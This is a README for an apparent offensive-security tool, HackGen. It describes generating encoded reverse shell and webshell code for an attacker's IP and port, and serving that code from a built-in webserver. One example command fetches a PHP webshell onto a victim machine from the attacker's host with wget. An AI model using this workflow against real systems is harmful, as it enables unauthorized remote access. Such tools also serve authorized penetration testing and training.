# HackGen
> Pretty much msfvenom, but I hate Metasploit >:(

## Installation:
- Clone this repo to whatever directory you want.
  Note: This repo uses submodules so use the command below to avoid headaches:
```
git clone --recurse-submodules https://github.com/owenCocjin/HackGen.git
```
- Change the path of the rshells.db database to the <b>ABSOLUTE</b> path of the install dir
- Optional: Link the "hackgen.py" script to somewhere in your path so it can be executed from anywhere!

## Usage:
> Use the `-h` flag for details on the usage.

This script was created to easily produce reverse shell codes with an attacker's IP & port in the script.
It can also urlencode or base64 encode the resulting script.
### Webserver:
One fun feature is that you can start hackgen as a webserver which makes it incredibly easy to get rshell code onto a target.
Once the hackgen command us run with the `-w` flag, it will start a webserver on port 8000. When a GET request is sent to the server, it will reply with just the rshell string. Because the server will return the same rhsell code no matter the requested endpoint, a simple way to save to a file is to use `wget` to get a specific page from the server. Because all "pages" return the same thing, wget will end up writing the retrieved rshell to the fetched page. For example, if we wanted to write a PHP webshell to file "webshell.php", on the attacker machine we would run the command:
```
hackgen.py <your ip> <your port> -wf php -n webshell
```
And on the victim machine, we would run:
```
wget http://<your ip>:8000/webshell.php
```
This will save the PHP webshell to the attacker machine under the filename: "webshell.php"

---

## To-Do:
- Allow default IP/port by adding a config specifying which network device to get IP from